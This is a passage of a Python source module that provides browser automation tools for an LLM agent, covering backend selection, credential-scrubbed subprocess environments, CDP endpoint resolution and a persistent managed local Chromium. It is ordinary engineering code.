#!/usr/bin/env python3
"""
Browser Tool Module

This module provides browser automation tools using agent-browser CLI.  It
supports multiple backends — **Browser Use** (cloud, default for Nous
subscribers), **Browserbase** (cloud, direct credentials), and **local
Chromium** — with identical agent-facing behaviour.  The backend is
auto-detected from config and available credentials.

The tool uses agent-browser's accessibility tree (ariaSnapshot) for text-based
page representation, making it ideal for LLM agents without vision capabilities.

Features:
- **Local mode** (default): zero-cost headless Chromium via agent-browser.
  Works on Linux servers without a display.  One-time setup:
  ``agent-browser install`` (downloads Chromium) or
  ``agent-browser install --with-deps`` (also installs system libraries for
  Debian/Ubuntu/Docker).
- **Cloud mode**: Browserbase or Browser Use cloud execution when configured.
- Session isolation per task ID
- Text-based page snapshots using accessibility tree
- Element interaction via ref selectors (@e1, @e2, etc.)
- Task-aware content extraction using LLM summarization
- Automatic cleanup of browser sessions

Environment Variables:
- BROWSERBASE_API_KEY: API key for direct Browserbase cloud mode
- BROWSERBASE_PROJECT_ID: Project ID for direct Browserbase cloud mode
- BROWSER_USE_API_KEY: API key for direct Browser Use cloud mode
- BROWSERBASE_PROXIES: Enable/disable residential proxies (default: "true")
- BROWSERBASE_ADVANCED_STEALTH: Enable advanced stealth mode with custom Chromium,
  requires Scale Plan (default: "false")
- BROWSERBASE_KEEP_ALIVE: Enable keepAlive for session reconnection after disconnects,
  requires paid plan (default: "true")
- BROWSERBASE_SESSION_TIMEOUT: Custom session timeout in seconds (max 21600 = 6h).
  Set to extend beyond project default. Common values: 600 (10min), 1800 (30min) (default: none)

Usage:
    from tools.browser_tool import browser_navigate, browser_snapshot, browser_click

    # Navigate to a page
    result = browser_navigate("https://example.com", task_id="task_123")

    # Get page snapshot
    snapshot = browser_snapshot(task_id="task_123")

    # Click an element
    browser_click("@e5", task_id="task_123")
"""

import atexit
import contextlib
import functools
import json
import logging
import os
import signal
import re
import subprocess
import shutil
import sys
import tempfile
import threading
import time
from datetime import datetime, timezone
from typing import Dict, Any, Optional, List, Tuple, Union
from pathlib import Path
from agent.redact import redact_cdp_url
from hermes_constants import (
    agent_browser_runnable,
    get_hermes_home,
    get_hermes_home_override,
    hermes_home_key,
    node_tool_runnable,
    reset_hermes_home_override,
    set_hermes_home_override,
)
from utils import env_int, is_truthy_value
from hermes_cli.config import DEFAULT_CONFIG, cfg_get
from hermes_cli._subprocess_compat import windows_hide_flags


def __getattr__(name: str):
    """Lazy module attributes (PEP 562) — import diet for cold start.

    ``requests`` (~40 ms) and ``agent.auxiliary_client.call_llm`` (~65 ms)
    are only needed on specific code paths, so they load on first use. The
    module-level names are preserved for the test-patch surface
    (``patch("tools.browser_tool.requests.get")`` /
    ``patch("tools.browser_tool.call_llm")``): first attribute access imports
    the real object and binds it into module globals.
    """
    if name == "requests":
        import requests as _requests

        globals()["requests"] = _requests
        return _requests
    if name == "call_llm":
        from agent.auxiliary_client import call_llm as _call_llm

        globals()["call_llm"] = _call_llm
        return _call_llm
    raise AttributeError(f"module {__name__!r} has no attribute {name!r}")


def _lazy_call_llm(*args, **kwargs):
    """Invoke ``call_llm`` through module globals so test patches of
    ``tools.browser_tool.call_llm`` are honored, importing lazily otherwise."""
    fn = globals().get("call_llm")
    if fn is None:
        fn = __getattr__("call_llm")
    return fn(*args, **kwargs)

# Browser-specific tool keys passed through to the agent-browser subprocess
# AFTER credential stripping.  agent-browser is a Node process loading npm
# deps; handing it the full operator keyring (#29157 / GHSA-m4m8-xjp4-5rmm)
# means a compromised transitive dependency could read every Hermes secret
# straight out of process.env.  Strip by default, then re-add only the
# browser-backend keys the worker legitimately needs.
_BROWSER_PASSTHROUGH_KEYS: tuple[str, ...] = (
    "BROWSERBASE_API_KEY",
    "BROWSERBASE_PROJECT_ID",
    "BROWSER_USE_API_KEY",
    "FIRECRAWL_API_KEY",
    "FIRECRAWL_API_URL",
    "FIRECRAWL_BROWSER_TTL",
)


def _build_browser_env() -> dict:
    """Credential-scrubbed env for an agent-browser subprocess.

    Strips Hermes-managed secrets (provider keys, gateway tokens, GitHub auth,
    infra secrets) then re-adds only the browser-backend keys the worker needs.
    The ``hermes_subprocess_env`` import is deferred to keep ``browser_tool``
    importable under test harnesses that load it against a stubbed ``tools``
    package (tests/tools/test_managed_browserbase_and_modal.py).
    """
    from tools.environments.local import hermes_subprocess_env

    env = hermes_subprocess_env(inherit_credentials=False)
    for _key in _BROWSER_PASSTHROUGH_KEYS:
        if _key in os.environ:
            env[_key] = os.environ[_key]
    return env

try:
    from tools.website_policy import check_website_access
except Exception:
    check_website_access = lambda url: None  # noqa: E731 — fail-open if policy module unavailable

try:
    from tools.url_safety import (
        is_safe_url as _is_safe_url,
        is_always_blocked_url as _is_always_blocked_url,
        normalize_url_for_request as _normalize_url_for_request,
        sensitive_query_param_name as _sensitive_query_param_name,
    )
except Exception:
    _is_safe_url = lambda url: False  # noqa: E731 — fail-closed: block all if safety module unavailable
    _is_always_blocked_url = lambda url: True  # noqa: E731 — fail-closed on the floor too
    _normalize_url_for_request = lambda url: url  # noqa: E731 — best-effort fallback
    _sensitive_query_param_name = lambda url: None  # noqa: E731 — best-effort fallback
# Browser-provider ABC + registry — PR #25214 moved the per-vendor providers
# (Browserbase / Browser Use / Firecrawl) out of ``tools/browser_providers/``
# and into ``plugins/browser/<vendor>/``. The dispatcher consults the
# registry; the legacy class names are re-exported below as backward-compat
# shims for callers that import them from this module.
from agent.browser_provider import BrowserProvider as CloudBrowserProvider  # noqa: F401  (legacy alias)
from agent.browser_registry import (  # noqa: F401  (test-patchable surface)
    get_provider as _registry_get_browser_provider,
)
try:
    from agent.browser_registry import (
        registry_generation as _browser_registry_generation,
    )
except ImportError:
    # A few isolated compatibility tests intentionally install a minimal
    # ``agent.browser_registry`` stub exposing only ``get_provider``. Those
    # harnesses have no mutable registry, so a constant generation is exact.
    def _browser_registry_generation(*, scope=None):
        return (0, 0)
from plugins.browser.browserbase.provider import (  # noqa: F401  (legacy import surface)
    BrowserbaseBrowserProvider as BrowserbaseProvider,
)
from plugins.browser.browser_use.provider import (  # noqa: F401
    BrowserUseBrowserProvider as BrowserUseProvider,
)
from plugins.browser.firecrawl.provider import (  # noqa: F401
    FirecrawlBrowserProvider as FirecrawlProvider,
)
from tools.tool_backend_helpers import normalize_browser_cloud_provider
# Camofox local anti-detection browser backend (optional).
# When CAMOFOX_URL is set, all browser operations route through the
# camofox REST API instead of the agent-browser CLI.
try:
    from tools.browser_camofox import is_camofox_mode as _is_camofox_mode
except ImportError:
    _is_camofox_mode = lambda: False  # noqa: E731
# Browser Use CLI (optional)
try:
    from tools.browser_use_cli import is_browser_use_cli_mode as _is_browser_use_cli_mode
except ImportError:
    _is_browser_use_cli_mode = lambda: False  # noqa: E731

logger = logging.getLogger(__name__)

# Standard PATH entries for environments with minimal PATH (e.g. systemd services).
# Includes Android/Termux and macOS Homebrew locations needed for agent-browser,
# npx, node, and Android's glibc runner (grun).
_SANE_PATH_DIRS = (
    "/data/data/com.termux/files/usr/bin",
    "/data/data/com.termux/files/usr/sbin",
    "/opt/homebrew/bin",
    "/opt/homebrew/sbin",
    "/usr/local/sbin",
    "/usr/local/bin",
    "/usr/sbin",
    "/usr/bin",
    "/sbin",
    "/bin",
)
_SANE_PATH = os.pathsep.join(_SANE_PATH_DIRS)


@functools.lru_cache(maxsize=1)
def _discover_homebrew_node_dirs() -> tuple[str, ...]:
    """Find Homebrew versioned Node.js bin directories (e.g. node@20, node@24).

    When Node is installed via ``brew install node@24`` and NOT linked into
    /opt/homebrew/bin, agent-browser isn't discoverable on the default PATH.
    This function finds those directories so they can be prepended.
    """
    dirs: list[str] = []
    homebrew_opt = "/opt/homebrew/opt"
    if not os.path.isdir(homebrew_opt):
        return tuple(dirs)
    try:
        for entry in os.listdir(homebrew_opt):
            if entry.startswith("node") and entry != "node":
                bin_dir = os.path.join(homebrew_opt, entry, "bin")
                if os.path.isdir(bin_dir):
                    dirs.append(bin_dir)
    except OSError:
        pass
    return tuple(dirs)


def _browser_candidate_path_dirs() -> list[str]:
    """Return ordered browser CLI PATH candidates shared by discovery and execution."""
    hermes_home = get_hermes_home()
    hermes_node_bin = str(hermes_home / "node" / "bin")
    hermes_node_root = str(hermes_home / "node")
    hermes_nm_bin = str(hermes_home / "node_modules" / ".bin")
    return [hermes_node_bin, hermes_node_root, hermes_nm_bin, *list(_discover_homebrew_node_dirs()), *_SANE_PATH_DIRS]


def _merge_browser_path(existing_path: str = "") -> str:
    """Prepend browser-specific PATH fallbacks without reordering existing entries."""
    path_parts = [p for p in (existing_path or "").split(os.pathsep) if p]
    existing_parts = set(path_parts)
    prefix_parts: list[str] = []

    for part in _browser_candidate_path_dirs():
        if not part or part in existing_parts or part in prefix_parts:
            continue
        if os.path.isdir(part):
            prefix_parts.append(part)

    return os.pathsep.join(prefix_parts + path_parts)

# Throttle screenshot cleanup to avoid repeated full directory scans.
_last_screenshot_cleanup_by_dir: dict[str, float] = {}

# ============================================================================
# Configuration
# ============================================================================

# Default timeout for browser commands (seconds)
DEFAULT_COMMAND_TIMEOUT = 30

# Floor for ``open`` (navigate) — cold daemon + first Chromium launch can exceed
# the generic command_timeout on slow or library-starved Linux hosts.
MIN_OPEN_TIMEOUT = 60
MIN_FIRST_OPEN_TIMEOUT = 120

# Default max chars for snapshot content before truncation. Aligned with
# web_tools.DEFAULT_EXTRACT_CHAR_LIMIT (15000) — the snapshot and
# web_extract paths share the same truncate-and-store pattern, so the model
# gets the same per-page budget from both. Configurable via
# ``browser.snapshot_threshold`` in config.yaml.
DEFAULT_SNAPSHOT_THRESHOLD = 15000
MIN_SNAPSHOT_THRESHOLD = 1000

# Backwards-compatible import surface. Runtime call sites use
# ``get_browser_snapshot_threshold()`` so config overrides take effect.
SNAPSHOT_SUMMARIZE_THRESHOLD = DEFAULT_SNAPSHOT_THRESHOLD

# Hard ceiling on the full-snapshot file written to cache/web when a snapshot
# is truncated. Mirrors web_tools.MAX_STORED_TEXT_CHARS —
# the model only ever sees the truncated view; the stored copy exists for
# read_file paging and must not write unbounded bytes to disk.
MAX_STORED_SNAPSHOT_CHARS = 2_000_000

# Commands that legitimately return empty stdout (e.g. close, record).
_EMPTY_OK_COMMANDS: frozenset = frozenset({"close", "record"})

_cached_command_timeout: Optional[int] = None
_command_timeout_resolved = False
_cached_snapshot_threshold: Optional[int] = None
_snapshot_threshold_resolved = False


def _sanitize_url_for_logs(value: object) -> str:
    """Mask secrets in logged browser endpoint URLs and URL-like errors.

    Thin wrapper over :func:`agent.redact.redact_cdp_url`, which is the single
    source of truth for CDP-URL log redaction. Kept as a local name because
    several browser-tool log sites reference it; the redaction policy itself
    lives once in ``redact.py`` so the browser tool and the CDP supervisor
    cannot drift apart.
    """
    return redact_cdp_url(value)


def _get_command_timeout() -> int:
    """Return the configured browser command timeout from config.yaml.

    Reads ``config["browser"]["command_timeout"]`` and falls back to
    ``DEFAULT_COMMAND_TIMEOUT`` (30s) if unset or unreadable.  Result is
    cached after the first call and cleared by ``cleanup_all_browsers()``.
    """
    global _cached_command_timeout, _command_timeout_resolved
    if _command_timeout_resolved and _cached_command_timeout is not None:
        return _cached_command_timeout

    result = DEFAULT_COMMAND_TIMEOUT
    try:
        from hermes_cli.config import read_raw_config
        cfg = read_raw_config()
        val = cfg_get(cfg, "browser", "command_timeout")
        if val is not None:
            result = max(int(val), 5)  # Floor at 5s to avoid instant kills
    except Exception as e:
        logger.debug("Could not read command_timeout from config: %s", e)
    # Assign the cached value BEFORE flipping the resolved flag so a
    # concurrent reader cannot observe ``resolved=True`` while the cache
    # is still ``None`` (see issue #14331).
    _cached_command_timeout = result
    _command_timeout_resolved = True
    return result


def _safe_command_timeout() -> int:
    """Like ``_get_command_timeout`` but guaranteed non-None.

    Defense in depth against the race fixed in ``_get_command_timeout``:
    if anything ever returns ``None`` (e.g. cache reset mid-flight), fall
    back to ``DEFAULT_COMMAND_TIMEOUT``. Uses ``is not None`` rather than
    ``or`` so a legitimately configured ``0`` is preserved.
    """
    val = _get_command_timeout()
    return val if val is not None else DEFAULT_COMMAND_TIMEOUT


def get_browser_snapshot_threshold() -> int:
    """Return the configured maximum browser snapshot size in characters.

    Reads the raw profile-aware config so tool JSON output is not affected by
    config-loader warnings. The value is cached for the browser lifecycle and
    reset by :func:`cleanup_all_browsers`.
    """
    global _cached_snapshot_threshold, _snapshot_threshold_resolved
    if _snapshot_threshold_resolved and _cached_snapshot_threshold is not None:
        return _cached_snapshot_threshold

    result = DEFAULT_SNAPSHOT_THRESHOLD
    try:
        from hermes_cli.config import read_raw_config
        cfg = read_raw_config()
        val = cfg_get(cfg, "browser", "snapshot_threshold")
        if val is not None:
            result = max(int(val), MIN_SNAPSHOT_THRESHOLD)
    except Exception as exc:
        logger.debug("Could not read browser.snapshot_threshold: %s", exc)

    # Preserve the same race-safety invariant as the command-timeout cache.
    _cached_snapshot_threshold = result
    _snapshot_threshold_resolved = True
    return result


def _get_open_command_timeout(*, first_open: bool = False) -> int:
    """Timeout for agent-browser ``open`` (navigation / daemon cold start)."""
    base = _safe_command_timeout()
    floor = MIN_FIRST_OPEN_TIMEOUT if first_open else MIN_OPEN_TIMEOUT
    return max(base, floor)


def _needs_chromium_sandbox_bypass() -> bool:
    """Return True when Chromium needs --no-sandbox to start reliably."""
    if hasattr(os, "geteuid") and os.geteuid() == 0:
        return True
    if _running_in_docker():
        return True
    userns_restrict = "/proc/sys/kernel/apparmor_restrict_unprivileged_userns"
    try:
        with open(userns_restrict, encoding="utf-8") as f:
            if f.read().strip() == "1":
                return True
    except OSError:
        pass
    return False


def _apply_chromium_sandbox_args(browser_env: Dict[str, str]) -> None:
    """Add required Chromium sandbox flags without overriding user settings."""
    if (
        "AGENT_BROWSER_ARGS" not in browser_env
        and "AGENT_BROWSER_CHROME_FLAGS" not in browser_env
        and _needs_chromium_sandbox_bypass()
    ):
        logger.debug(
            "browser: sandbox bypass needed (root/docker/AppArmor userns) — "
            "injecting --no-sandbox"
        )
        browser_env["AGENT_BROWSER_ARGS"] = "--no-sandbox,--disable-dev-shm-usage"


def _read_command_output_files(stdout_path: str, stderr_path: str) -> tuple[str, str]:
    """Best-effort read of agent-browser stdout/stderr temp files."""
    stdout = stderr = ""
    for path, slot in ((stdout_path, "stdout"), (stderr_path, "stderr")):
        try:
            with open(path, "r", encoding="utf-8") as f:
                text = f.read().strip()
        except OSError:
            continue
        if slot == "stdout":
            stdout = text
        else:
            stderr = text
    return stdout, stderr


def _unlink_command_output_files(*paths: str) -> None:
    for path in paths:
        try:
            os.unlink(path)
        except OSError:
            pass


def _format_browser_timeout_error(
    command: str,
    timeout: int,
    stdout: str,
    stderr: str,
) -> str:
    """Build an actionable timeout message from captured daemon output."""
    parts = [f"Command timed out after {timeout} seconds"]
    detail = (stderr or stdout or "").strip()
    if detail:
        parts.append(detail[:1500])

    combined = f"{stderr}\n{stdout}".lower()
    hints: list[str] = []
    if "sandbox" in combined:
        hints.append(
            "Chromium sandbox launch failed. Set AGENT_BROWSER_ARGS="
            "'--no-sandbox,--disable-dev-shm-usage' in your environment, "
            "or run: npx agent-browser install --with-deps"
        )
    elif command == "open" and _is_local_mode():
        if _running_in_docker():
            hints.append(
                "The browser daemon may still be starting or Chromium may be "
                "missing. Pull the latest image: "
                "docker pull ghcr.io/nousresearch/hermes-agent:latest"
            )
        else:
            hints.append(
                "The browser daemon may still be starting, or Chromium may be "
                "missing system libraries. Install/repair with: "
                "npx agent-browser install --with-deps "
                "(or: npx playwright install --with-deps chromium)"
            )
    if hints:
        parts.extend(hints)
    return "\n".join(parts)


def _get_vision_model() -> Optional[str]:
    """Model for browser_vision (screenshot analysis — multimodal)."""
    return os.getenv("AUXILIARY_VISION_MODEL", "").strip() or None


def _resolve_cdp_override(cdp_url: str) -> str:
    """Normalize a user-supplied CDP endpoint into a concrete connectable URL.

    Accepts:
    - full websocket endpoints: ws://host:port/devtools/browser/...
    - HTTP discovery endpoints: http://host:port or http://host:port/json/version
    - bare websocket host:port values like ws://host:port

    For discovery-style endpoints we fetch /json/version and return the
    webSocketDebuggerUrl so downstream tools always receive a concrete browser
    websocket instead of an ambiguous host:port URL.
    """
    raw = (cdp_url or "").strip()
    if not raw:
        return ""

    lowered = raw.lower()
    if "/devtools/browser/" in lowered:
        return raw

    discovery_url = raw
    if lowered.startswith(("ws://", "wss://")):
        if raw.count(":") == 2 and raw.rstrip("/").rsplit(":", 1)[-1].isdigit() and "/" not in raw.split(":", 2)[-1]:
            discovery_url = ("http://" if lowered.startswith("ws://") else "https://") + raw.split("://", 1)[1]
        else:
            return raw

    if discovery_url.lower().endswith("/json/version"):
        version_url = discovery_url
    else:
        version_url = discovery_url.rstrip("/") + "/json/version"

    try:
        import requests  # lazy — shared module object, test patches still apply

        response = requests.get(version_url, timeout=10)
        response.raise_for_status()
        payload = response.json()
    except Exception as exc:
        logger.warning(
            "Failed to resolve CDP endpoint %s via %s: %s",
            _sanitize_url_for_logs(raw),
            _sanitize_url_for_logs(version_url),
            _sanitize_url_for_logs(exc),
        )
        return raw

    ws_url = str(payload.get("webSocketDebuggerUrl") or "").strip()
    if ws_url:
        logger.info(
            "Resolved CDP endpoint %s -> %s",
            _sanitize_url_for_logs(raw),
            _sanitize_url_for_logs(ws_url),
        )
        return ws_url

    logger.warning(
        "CDP discovery at %s did not return webSocketDebuggerUrl; using raw endpoint",
        _sanitize_url_for_logs(version_url),
    )
    return raw


def _get_cdp_override_raw() -> str:
    """Return the *configured* CDP override without any network I/O.

    Precedence is:
    1. ``BROWSER_CDP_URL`` env var (live override from ``/browser connect``)
    2. ``browser.cdp_url`` in config.yaml (persistent config)

    This is the availability-check variant: callers that only need to know
    *whether* a CDP override is configured (tool ``check_fn`` gates,
    ``_is_local_mode`` / ``_is_local_backend`` routing decisions,
    ``hermes doctor``) MUST use this instead of :func:`_get_cdp_override`.

    Rationale: ``_get_cdp_override`` resolves the endpoint over HTTP
    (``/json/version`` discovery, 10s timeout). Tool-schema assembly runs at
    every CLI/Desktop startup and probes several browser-family check_fns;
    when a *stale* ``browser.cdp_url`` points at a dead endpoint (the debug
    Chrome it referenced is long gone), each check blocked on a failing
    socket connect and startup stalled for 10+ seconds before the banner —
    with no error, just mystery slowness. Same principle as the existing
    "do not execute ``agent-browser --version`` here" rule in
    ``check_browser_requirements``: no side effects during schema build.
    """
    env_override = os.environ.get("BROWSER_CDP_URL", "").strip()
    if env_override:
        return env_override

    try:
        from hermes_cli.config import read_raw_config

        cfg = read_raw_config()
        browser_cfg = cfg.get("browser", {})
        if isinstance(browser_cfg, dict):
            return str(browser_cfg.get("cdp_url", "") or "").strip()
    except Exception as e:
        logger.debug("Could not read browser.cdp_url from config: %s", e)

    return ""


def _get_cdp_override() -> str:
    """Return a normalized CDP URL override, or empty string.

    Precedence is:
    1. ``BROWSER_CDP_URL`` env var (live override from ``/browser connect``)
    2. ``browser.cdp_url`` in config.yaml (persistent config)

    When either is set, we skip both Browserbase and the local headless
    launcher and connect directly to the supplied Chrome DevTools Protocol
    endpoint.

    NOTE: resolution may perform an HTTP ``/json/version`` discovery request.
    Only call this on paths that are about to *connect* (session creation,
    supervisor attach). Pure is-it-configured gates must use
    :func:`_get_cdp_override_raw`.
    """
    raw = _get_cdp_override_raw()
    if not raw:
        return ""
    return _resolve_cdp_override(raw)


# ============================================================================
# Managed local browser (hermes-mods, 2026-08-29)
# ============================================================================
#
# The local Chromium is no longer launched *through* agent-browser as a child
# of its daemon.  ``tools/browser_launcher`` starts it double-forked (PPID 1)
# and we attach over CDP instead.  Consequences, all deliberate:
#
#   * No Hermes shutdown path can take the window down mid-task - not the
#     ``atexit`` handler, not a gateway SIGKILL, not the orphan reaper's
#     tree-kill - because the browser is in nobody's process tree.
#   * ``close`` on a ``--cdp`` session only disconnects (measured on
#     agent-browser 0.33.0 and 0.35.1), so the existing cleanup paths keep
#     doing their legitimate work - reaping daemons - without touching it.
#   * The browser is closed only on purpose, through CDP ``Browser.close``,
#     which writes ``exit_type: "Normal"`` and ends the "restore pages?"
#     bubble that a SIGKILLed Chromium produced on every restart.
#
# Nothing here disarms an upstream code path; the whole change is additive,
# which keeps the merge surface of this mod down to a handful of insertions.

#: HTTP CDP base URL of the browser this process manages, or None.
_MANAGED_CDP_URL: Optional[str] = None
#: Fixed agent-browser session name for the managed endpoint.  Upstream mints a
#: random ``cdp_<uuid>`` per session key, which would spawn one daemon (plus
#: socket dir and owner_pid file) per task - the local persistent-profile
#: backend has always used one fixed name for exactly this reason.
_MANAGED_CDP_SESSION_NAME = "hermes_cdp"
_MANAGED_LAST_ACTIVITY: float = 0.0
_MANAGED_TAB_FINGERPRINT: Optional[Tuple[str, ...]] = None
#: Session keys that attached to an already-open browser and have not yet been
#: handed the tab inventory.
_PENDING_RESUME_HINT: set = set()
_managed_lock = threading.Lock()


def _managed_browser_applies() -> bool:
    """Whether this install's browser is the local persistent-profile one.

    Returns False when the operator pointed Hermes somewhere else (a manual
    ``/browser connect``, a ``browser.cdp_url`` in config, a cloud provider,
    Camofox).  An explicit human choice always wins over the managed path.
    """
    raw = _get_cdp_override_raw()
    if raw and raw != _MANAGED_CDP_URL:
        return False
    try:
        if _is_camofox_mode():
            return False
    except Exception:
        pass
    try:
        if _get_cloud_provider() is not None:
            return False
    except Exception:
        pass
    try:
        return bool(_get_local_browser_settings().get("profile_dir"))
    except Exception:
        return False


def _is_managed_cdp_url(cdp_url: str) -> bool:
    """True when *cdp_url* addresses the browser this process manages."""
    if not _MANAGED_CDP_URL or not cdp_url:
        return False
    try:
        from urllib.parse import urlparse
        return urlparse(cdp_url).port == urlparse(_MANAGED_CDP_URL).port
    except Exception:
        return False


def _ensure_managed_browser(task_id: str) -> Optional[bool]:
    """Guarantee a live browser and point ``BROWSER_CDP_URL`` at it.

    Must run BEFORE ``_get_cdp_override()``: resolution performs
    ``/json/version`` discovery with a 10s timeout, so pointing at a dead
    endpoint reproduces the exact startup stall documented in
    ``_get_cdp_override_raw``.  Publishing the URL through the environment
    rather than ``config.yaml`` keeps the config honest - there is no
    persistent claim that a CDP endpoint exists while the browser is closed,
    which is its normal state here.

    Best-effort: a launch failure logs and returns, leaving the caller on the
    ordinary local session path rather than breaking the tool call.
    """
    global _MANAGED_CDP_URL, _MANAGED_LAST_ACTIVITY, _MANAGED_TAB_FINGERPRINT
    if not _managed_browser_applies():
        return None
    try:
        from tools import browser_launcher
        base, attached = browser_launcher.ensure_running()
    except Exception as exc:
        logger.warning("Managed browser could not be started: %s", exc)
        return None
    with _managed_lock:
        _MANAGED_CDP_URL = base
        os.environ["BROWSER_CDP_URL"] = base
        _MANAGED_LAST_ACTIVITY = time.time()
        try:
            _MANAGED_TAB_FINGERPRINT = browser_launcher.tab_fingerprint(base)
        except Exception:
            _MANAGED_TAB_FINGERPRINT = None
        if attached:
            _PENDING_RESUME_HINT.add(task_id)
    return attached


def _forget_managed_browser() -> None:
    """Drop every trace of the managed endpoint once the browser is closed."""
    global _MANAGED_CDP_URL, _MANAGED_TAB_FINGERPRINT
    with _managed_lock:
        _MANAGED_CDP_URL = None
        _MANAGED_TAB_FINGERPRINT = None
        _PENDING_RESUME_HINT.clear()
        os.environ.pop("BROWSER_CDP_URL", None)


def _maybe_close_idle_managed_browser() -> None:
    """Close the managed browser after a long idle period - unless a human is
    using the window.

    The guard is the whole point.  This is the operator's own window, on his
    own profile, and he drives it himself between agent tasks.  If the set of
    open page URLs moved since our last tool call, somebody is using it, so the
    net stands down and re-arms rather than closing a page being read.

    ``browser.inactivity_timeout: 0`` disables the net entirely, which turns
    the browser into "closes only on browser_close" without a code change.
    """
    global _MANAGED_LAST_ACTIVITY, _MANAGED_TAB_FINGERPRINT
    timeout = BROWSER_SESSION_INACTIVITY_TIMEOUT
    if not timeout or timeout <= 0:
        return
    with _managed_lock:
        base = _MANAGED_CDP_URL
        last = _MANAGED_LAST_ACTIVITY
        known = _MANAGED_TAB_FINGERPRINT
    if not base or not last or (time.time() - last) < timeout:
        return
    try:
        from tools import browser_launcher
        current = browser_launcher.tab_fingerprint(base)
        if current is None:
            _forget_managed_browser()  # browser already gone
            return
        if known is not None and current != known:
            with _managed_lock:
                _MANAGED_TAB_FINGERPRINT = current
                _MANAGED_LAST_ACTIVITY = time.time()
            logger.info(
                "Managed browser idle for %ss but its tabs changed - a human is "
                "using the window; leaving it open.", int(timeout),
            )
            return
        logger.info("Closing managed browser after %ss of inactivity", int(timeout))
        browser_launcher.close_browser()
        _forget_managed_browser()
    except Exception as exc:
        logger.debug("Idle managed-browser check failed: %s", exc)


def _browser_resume_hint(task_id: str) -> Optional[Dict[str, Any]]:
    """Tab inventory handed to the agent on its first call after an attach.

    Delivered in the tool RESULT rather than in the system prompt: it costs
    nothing on the many turns that never touch a browser, and it lands in front
    of the model at the moment it is actionable instead of tens of thousands of
    tokens earlier.  Same mechanism as ``_blank_tab_recovery_hint`` (2026-07-19),
    and safe from recursion for the same reason - the session already exists by
    the time this runs.
    """
    try:
        result = _run_browser_command(task_id, "tab", ["list"], timeout=8)
        if not result.get("success"):
            return None
        tabs, _active_index = _normalize_tab_payload(result.get("data", {}))
        if not tabs:
            return None
        return {
            "reason": "attached_to_existing_browser",
            "message": (
                "The browser was already open - you did not start it. Review "
                "the tabs below: close the ones irrelevant to the current task "
                "with browser_tab(action='close', index=N), and use the "
                "relevant ones instead of re-navigating. NEVER close a tab "
                "marked \"protected\": that is the page the user was on."
            ),
            "tabs": [
                {
                    "index": tab["index"],
                    "title": tab.get("title", ""),
                    "url": tab.get("url", ""),
                    "protected": bool(tab.get("active")),
                }
                for tab in tabs
            ],
        }
    except Exception as exc:  # never let the hint break a tool call
        logger.debug("Browser resume hint failed: %s", exc)
        return None


def _get_dialog_policy_config() -> Tuple[str, float]:
    """Read ``browser.dialog_policy`` + ``browser.dialog_timeout_s`` from config.

    Returns a ``(policy, timeout_s)`` tuple, falling back to the supervisor's
    defaults when keys are absent or invalid.
    """
    # Defer imports so browser_tool can be imported in minimal environments.
    from tools.browser_supervisor import (
        DEFAULT_DIALOG_POLICY,
        DEFAULT_DIALOG_TIMEOUT_S,
        _VALID_POLICIES,
    )

    try:
        from hermes_cli.config import read_raw_config

        cfg = read_raw_config()
        browser_cfg = cfg.get("browser", {}) if isinstance(cfg, dict) else {}
        if not isinstance(browser_cfg, dict):
            return DEFAULT_DIALOG_POLICY, DEFAULT_DIALOG_TIMEOUT_S
        policy = str(browser_cfg.get("dialog_policy") or DEFAULT_DIALOG_POLICY)
        if policy not in _VALID_POLICIES:
            logger.debug("Invalid browser.dialog_policy=%r; using default", policy)
            policy = DEFAULT_DIALOG_POLICY
        timeout_raw = browser_cfg.get("dialog_timeout_s")
        try:
            timeout_s = float(timeout_raw) if timeout_raw is not None else DEFAULT_DIALOG_TIMEOUT_S
            if timeout_s <= 0:
                timeout_s = DEFAULT_DIALOG_TIMEOUT_S
        except (TypeError, ValueError):
            timeout_s = DEFAULT_DIALOG_TIMEOUT_S
        return policy, timeout_s
    except Exception:
        return DEFAULT_DIALOG_POLICY, DEFAULT_DIALOG_TIMEOUT_S


def _ensure_cdp_supervisor(task_id: str) -> None:
    """Start a CDP supervisor for ``task_id`` if an endpoint is reachable.

    Idempotent — delegates to ``SupervisorRegistry.get_or_start`` which skips
    when a supervisor for this ``(task_id, cdp_url)`` already exists and
    tears down + restarts on URL change. Safe to call on every
    ``browser_navigate`` / ``/browser connect`` without worrying about
    double-attach.

    Resolves the CDP URL in this order:
      1. ``BROWSER_CDP_URL`` / ``browser.cdp_url`` — covers ``/browser connect``
         and config-set overrides.
      2. ``_active_sessions[task_id]["cdp_url"]`` — covers Browserbase + any
         other cloud provider whose ``create_session`` returns a raw CDP URL.

    Swallows all errors — failing to attach the supervisor must not break
    the browser session itself.  The agent simply won't see
    ``pending_dialogs`` / ``frame_tree`` fields in snapshots.
    """
    cdp_url = _get_cdp_override()
    if not cdp_url:
        # Fallback: active session may carry a per-session CDP URL from a
        # cloud provider (Browserbase sets this).
        with _cleanup_lock:
            session_info = _active_sessions.get(task_id, {})
        maybe = str(session_info.get("cdp_url") or "")
        if maybe:
            cdp_url = _resolve_cdp_override(maybe)
    if not cdp_url:
        return
    try:
        from tools.browser_supervisor import SUPERVISOR_REGISTRY  # type: ignore[import-not-found]

        policy, timeout_s = _get_dialog_policy_config()
        SUPERVISOR_REGISTRY.get_or_start(
            task_id=task_id,
            cdp_url=cdp_url,
            dialog_policy=policy,
            dialog_timeout_s=timeout_s,
        )
    except Exception as exc:
        logger.debug(
            "CDP supervisor attach for task=%s failed (non-fatal): %s",
            task_id,
            exc,
        )


def _stop_cdp_supervisor(task_id: str) -> None:
    """Stop the CDP supervisor for ``task_id`` if one exists. No-op otherwise."""
    try:
        from tools.browser_supervisor import SUPERVISOR_REGISTRY  # type: ignore[import-not-found]

        SUPERVISOR_REGISTRY.stop(task_id)
    except Exception as exc:
        logger.debug("CDP supervisor stop for task=%s failed (non-fatal): %s", task_id, exc)


# ============================================================================
# Cloud Provider Registry
# ============================================================================
#
# Per-vendor browser providers (Browserbase / Browser Use / Firecrawl) live as
# plugins under ``plugins/browser/<vendor>/`` and self-register through
# :mod:`agent.browser_registry` at plugin-discovery time. The legacy
# class-name registry below is preserved as a backward-compat shim so test
# fixtures that ``monkeypatch.setattr(browser_tool, "_PROVIDER_REGISTRY", ...)``
# keep working — but ``_get_cloud_provider()`` now consults
# :mod:`agent.browser_registry` for the actual lookup.
#
# When the test patches ``_PROVIDER_REGISTRY``, we honour it (so the cache
# unit tests still drive the function); otherwise the registry-backed path
# wins. This keeps the test surface stable while letting third-party
# plugins drop in under ``~/.hermes/plugins/browser/<vendor>/``.

_PROVIDER_REGISTRY: Dict[str, type] = {
